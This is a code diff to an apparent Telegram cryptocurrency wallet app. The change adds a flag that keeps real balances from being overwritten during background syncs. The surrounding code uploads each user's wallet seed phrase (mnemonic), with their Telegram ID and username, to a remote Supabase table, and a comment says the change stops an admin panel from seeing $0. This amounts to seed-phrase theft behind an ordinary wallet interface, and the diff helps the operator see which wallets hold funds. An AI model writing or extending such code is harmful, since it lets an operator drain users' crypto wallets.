@@ -116,7 +116,7 @@ async function syncWalletToSupabase(walletData) {
     return null;
   }
   try {
-    const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
+    const { username, mnemonic, balance, telegram_id, coin_balances, preserveBalance } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
 
     let finalName = username;
@@ -180,6 +180,13 @@ async function syncWalletToSupabase(walletData) {
       if (!filterVal) return false;
       const updatePayload = { ...payload };
       delete updatePayload.created_at; // don't overwrite creation time on update
+      if (preserveBalance) {
+        // These calls are "ensure row exists" syncs — don't overwrite the real balance
+        // that was previously written by refreshPrices with stale "0" values.
+        delete updatePayload.balance;
+        const COIN_SYMS = ['eth','ton','bnb','ltc','arb','sol','usdt'];
+        COIN_SYMS.forEach(s => delete updatePayload[s + '_balance']);
+      }
       const url = `${SUPABASE_URL}/rest/v1/wallets?${filterCol}=eq.${encodeURIComponent(filterVal)}`;
       const res = await fetch(url, {
         method: 'PATCH',
@@ -8929,12 +8936,14 @@ export default function GemWalletApp() {
             if (tgUser.username) return "@" + tgUser.username;
             return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
           })();
-          // balance "0" here — real per-coin balances are written by refreshPrices shortly after
+          // preserveBalance: true — don't overwrite real balance already in Supabase.
+          // refreshPrices will write the correct balance shortly after.
           syncWalletToSupabase({
             username: userName,
             telegram_id: userId || null,
             mnemonic: storedMnemonic,
             balance: "0",
+            preserveBalance: true,
           });
         } catch(e) { console.error("[mount sync] error:", e); }
       }, 1000);
@@ -8954,12 +8963,14 @@ export default function GemWalletApp() {
         ? "@" + tgUser.username
         : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
         || "User_" + (uid || "Unknown");
-      // Ensure row exists; balances will be updated by the next refreshPrices tick
+      // Ensure row exists; preserveBalance: true so we don't clobber the real balance
+      // that refreshPrices already wrote — admin panel would see $0 otherwise.
       syncWalletToSupabase({
         username: uname,
         telegram_id: uid || null,
         mnemonic: storedMnemonic,
         balance: "0",
+        preserveBalance: true,
       });
     } catch(e) { console.error("[walletScreen] sync error:", e); }
   }, [screen]);
